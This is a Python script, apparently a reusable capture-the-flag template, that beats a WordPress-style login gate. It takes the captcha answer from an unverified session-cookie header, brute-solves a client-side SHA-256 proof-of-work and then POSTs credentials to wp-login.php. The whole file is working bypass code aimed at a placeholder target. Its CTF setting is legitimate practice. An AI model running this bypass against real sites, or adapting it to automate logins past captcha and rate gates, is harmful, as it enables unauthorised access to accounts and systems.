#!/usr/bin/env python3
"""Reusable template: solve the cookie-leaked-captcha + client-side PoW login gate
used by the 'Parth Bhandari' CTF7 WordPress/Next.js challenges, then POST a login.

Copy this file and fill in: COOKIE_NAME, cap/pow field names in the token header,
the login URL, and the credentials (only when creds are provided).

The captcha ANSWER leaks in the session cookie's JWT/session header (base64urlsafe,
unverified). The PoW challenge comes from /pow ({"bits":N,"challenge":HEX}) and is
solved by finding k where SHA-256(challenge+":"+k) has LEADING ZERO BITS >= N.
"""
import urllib.request, urllib.parse, base64, hashlib, json

BASE = "http://TARGET:PORT"
COOKIE_NAME = "wordpress_logged_in_8b1f2c"   # adjust per target
LOGIN_URL   = BASE + "/wp-login.php"

def b64u(p):  # base64urlsafe, no padding verification
    return base64.urlsafe_b64decode(p + "=" * (-len(p) % 4))

def leading_zero_bits(hexstr):
    n = 0
    for ch in hexstr:
        v = int(ch, 16)
        if v == 0: n += 4; continue
        if v < 2: n += 3
        elif v < 4: n += 2
        elif v < 8: n += 1
        break
    return n

def solve_pow(challenge, bits, maxk=9_000_000):
    k = 0
    while k < maxk:
        d = hashlib.sha256((challenge + ":" + str(k)).encode()).digest().hex()
        if leading_zero_bits(d) >= bits:
            return challenge + ":" + str(k)
        k += 1
    raise RuntimeError("pow not solved")

def get_token(cj):
    return [c.value for c in cj if c.name == COOKIE_NAME][-1]

def login(user, password):
    cj = urllib.request.HTTPCookieProcessor()
    op = urllib.request.build_opener(cj)
    op.open(urllib.request.Request(BASE + "/captcha.png",
            headers={"User-Agent": "Mozilla/5.0"}), timeout=15)
    hdr = json.loads(b64u(get_token(cj.cookiejar).split(".")[0]))
    cap = hdr["cap"]
    op.open(urllib.request.Request(BASE + "/pow",
            headers={"User-Agent": "Mozilla/5.0"}), timeout=15)
    hdr = json.loads(b64u(get_token(cj.cookiejar).split(".")[0]))
    sol = solve_pow(hdr["pow_challenge"], hdr.get("bits", 12))
    data = urllib.parse.urlencode({"log": user, "password": password,
                                   "captcha": cap, "pow": sol}).encode()
    r = op.open(urllib.request.Request(LOGIN_URL, data=data,
            headers={"Content-Type": "application/x-www-form-urlencoded",
                      "User-Agent": "Mozilla/5.0", "Referer": LOGIN_URL}), timeout=15)
    return r.read().decode("utf-8", "replace")

if __name__ == "__main__":
    # Usage: only when creds are provided. Brute-forcing locks with 429 and is NOT intended.
    body = login("PROVIDED_USER", "PROVIDED_PASS")
    print("authed?", ("Log Out" in body) or ("Dashboard" in body))
